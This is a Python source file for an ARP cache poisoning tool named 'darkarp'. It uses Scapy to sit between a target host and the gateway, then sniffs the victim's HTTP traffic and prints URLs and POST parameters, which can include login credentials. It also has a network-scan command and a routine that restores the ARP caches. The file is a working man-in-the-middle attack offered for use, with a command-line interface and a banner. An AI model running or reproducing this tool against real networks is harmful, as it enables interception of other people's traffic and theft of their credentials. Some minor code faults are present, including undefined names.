import argparse
import sys
import netfilterqueue
import re
import socket
import netifaces

from scapy.all import *
from scapy.layers.http import HTTPRequest
from os import system, getuid
from colorama import init, Fore
from multiprocessing import Process as pr

init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help='-t 192.168.0.5')

arg = parser.parse_args()

target = arg.target
gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]



class c:
    RED = '\033[0;34m'
    GREEN = '\033[92m'
    PURPLE = '\033[0;35m'
    ENDC = '\033[0m'


if getuid() != 0:
    print(f"{c.GREEN}You need to be a root user or gain root access for running this script!{c.ENDC}")
    exit()


print(f"\n\n\t⠀    ⣠⣴⣶⣯⠪⣕⢶⣦⣔⢄⠀⠀⠀⠀   ")
print(
    f"\t⠀⠀⠀⢀⣼⣿⣿⣿⣿⣧⡙⣧⢹⣿⣷⣇⠀⠀⠀⠀  \t\t\t{c.RED}      db      `7MMF' `YMM'`7MMF'   `7MF'{c.ENDC}     ")
print(
    f"\t⠀⠀⠀⣸⣿⣿⣿⣿⡟⠛⢿⣾⢿⡟⠟⢛⡄⠀⠀⠀  \t\t\t{c.RED}     ;MM:       MM   .M'    MM       M  {c.ENDC}    ")
print(
    f"\t⠀⠀⠀⣿⣿⣿⣿⢟⣯⢖⣒⣚⣭⠀⣣⣈⡨⣢⠀   \t\t\t{c.RED}    ,V^MM.      MM .d\"      MM       M  {c.ENDC}   ")
print(
    f"\t⠀⠀⠀⣿⣿⣿⢏⡛⠱⢿⣧⣿⢿⡂⠻⠭⠿⣴⠀⠀  \t\t\t{c.RED}   ,M  `MM      MMMMM.      MM       M  {c.ENDC}    ")
print(
    f"\t⠀⠀⣰⣿⣿⡟⢼⣿⡶⡄⣴⣶⣶⠇⠀⢶⣶⡎⡗⠀  \t\t\t{c.RED}   AbmmmqMA     MM  VMA     MM       M  {c.ENDC}    ")
print(
    f"\t⠀⢠⣿⣿⣿⢇⣷⣭⣃⠈⠙⠁⣠⢟⡟⡷⡙⢸⣷⠃  \t\t\t{c.RED}  A'     VML    MM   `MM.   YM.     ,M  {c.ENDC}    ")
print(
    f"\t⢀⣿⣿⠿⢟⣸⣷⠶⠯⠍⠀⡫⢬⣬⣤⣥⡅⣊⣿⣼  \t\t\t{c.RED}.AMA.   .AMMA..JMML.   MMb.  `bmmmmd\"'  {c.ENDC}")
print(f"\t⡜⣫⣴⣿⣿⣿⠁⢰⣿⣿⣿⣿⣞⠿⢛⣵⣾⡿⠛⠁                                                                  ")
print(
    f"\t⠙⠿⠿⠿⣿⣿⣼⣬⣿⣿⣿⣿⣿⣷⠟⠉⠁⠀⠀⠀\n\t\t\t\t\t\t{c.GREEN}@aku - raminiskandarov2004@gmail.com{c.ENDC}\n\n")

if len(sys.argv) == 1:
    parser.print_help(sys.stderr)
    sys.exit(1)
elif (gateway and target) is None:
    print(f"\t{c.GREEN}example: sudo python3 darkarp.py -t 192.168.0.5{c.ENDC}\n")
    sys.exit(1)


def get_mac(ip):
    try:
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=ip)
        resp, _ = srp(packet, timeout=2, retry=2, verbose=False)
        return resp[0][1].hwsrc
    except IndexError:
        print(
            f"{c.PURPLE}[e]{c.ENDC} IP {ip} doesn't exist in local network\n")
        os.system('kill %d' % os.getpid())


def craft_arp():

    # sending crafted arp request to the target

    arp_target = ARP()
    arp_target.op = 2
    arp_target.psrc = gateway
    arp_target.pdst = target
    arp_target.hwdst = get_mac(target)

    # sending crafted arp request to gateway

    arp_gateway = ARP()
    arp_gateway.op = 2
    arp_gateway.psrc = target
    arp_gateway.pdst = gateway
    arp_gateway.hwdst = get_mac(gateway)

    print(f"{c.GREEN}[!] ARP cache poisoning started...{c.ENDC}")
    

    while True:

        try:
            send(arp_target, count=4, verbose=False)
            send(arp_gateway, count=4, verbose=False)
        except KeyboardInterrupt:
            print(f"{c.GREEN}[!] ARP attack stopped...{c.ENDC} ")
            repair_target_network()
            exit()
            
            
def cmd():
    while True:
        try:
            cmd = input("darkarp> ")
            if cmd == 'help':
                menu = "\n\tsystem options\n\
                    \n\tclear - clear the terminal\
                    \n\texit - stop process and exit\n\
                    \n\tconsole options\n\
                    \n\tsniff wlan0 - enable HTTP sniffing on wlan0 interface\
                    \n\tstop_attack - stop ARP cahce poisoning\n\
                    \n\tnet_scan - scan local network IP addresses"
                print(menu)
            elif cmd == "sniff":
                print("\n\tplease define interface like - sniff wlan0\n")
            elif cmd.startswith("sniff "):
                iface = list(cmd.split(" "))
                if len(iface) != 2:
                    print("\n\tyou are able to define only 1 interface\n")
                elif iface[1] == " ":
                    print("\n\tplease define interface like - sniff wlan0\n")
                else:
                    try:
                        sniff_packets(iface[1])
                    except:
                        print(f"\n\tno interface found called {iface[1]}\n")
            elif cmd == "clear":
                if platform == "win32":
                    system('cls')
                else:
                    system('clear')
            elif cmd == "exit":
                repair_target_network()
            elif cmd == "net_scan":
                scan_netwrok()
            else:
                print(
                    f"command \"{cmd}\" not found, type \"help\" for list commands")
        except Exception as e:
            print(e)


def sniff_packets(iface):
    if iface == "":
        print("\n\tplease define interface like - sniff wlan0\n")
    else:
        try:
            print(
                f"{c.RED}HTTP packet sniffing started... Waiting HTTP requests...{c.ENDC}")
            sniff(filter=f"host {target}", prn=sniff_request,
                  iface=iface, store=False)
        except AttributeError:
            print(f"{c.PURPLE}[e]{c.ENDC} interface {iface} cannot found...\n")


def scan_netwrok():
    try:
        ip_range = target[:target.rfind('.')+1] + '1/24'
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range)

        result = srp(packet, timeout=3, verbose=0)[0]

        clients = []

        for _, received in result:
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})

        print(f"{c.RED}#Available devices in the network:{c.ENDC}")
        print(f"{c.GREEN}\tIP" + " "*18+f"MAC{c.ENDC}")
        for client in clients:
            print(f"\t{client['ip']}         {client['mac']}")
    except IndexError:
        pass


def sniff_request(packet):

    if packet.haslayer(HTTPRequest):

        url = packet[HTTPRequest].Host.decode(
        ) + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()
        print(
            f"{c.GREEN}[+] client: {ip} server: {url} method: {method}{c.ENDC}")
        if packet.haslayer(Raw) and method == "POST":
            print(
                f"{c.RED}[/] POST:\nParameters:\n{packet[Raw].load}{c.ENDC}")


def repair_target_network():

    # repair targets arp cache

    repair_target = ARP()
    repair_target.op = 2
    repair_target.psrc = gateway
    repair_target.hwsrc = get_mac(gateway)
    repair_target.pdst = target
    repair_target.hwdst = get_mac(target)

    # repair targets arp cache

    repair_gateway = ARP()
    repair_gateway.op = 2
    repair_gateway.psrc = target
    repair_gateway.hwsrc = get_mac(target)
    repair_gateway.pdst = gateway
    repair_gateway.hwdst = get_mac(gateway)

    print(f"{c.RED}[w]{c.ENDC} Repairing target's ARP cache")

    send(repair_target, count=5, verbose=False)

    print(f"{c.RED}[w]{c.ENDC} Repairing gateways's ARP cache")

    send(repair_gateway, count=5, verbose=False)

    os.system('kill %d' % os.getpid())


def main():
        try:
            if len(get_mac(target)) > 0:
                 pr(target=craft_arp).start()
                 time.sleep(3)
                 cmd()
        except IndexError:
            print(f"{c.PURPLE}[e]{c.ENDC} IP {ip} doesn't exist in local network\n")
            os.system('kill %d' % os.getpid())


if __name__ == '__main__':
    IPaddress = socket.gethostbyname(socket.gethostname())
    if IPaddress == "127.0.0.1":
        print("No internet")
        exit()
    else:
        pass
    main()
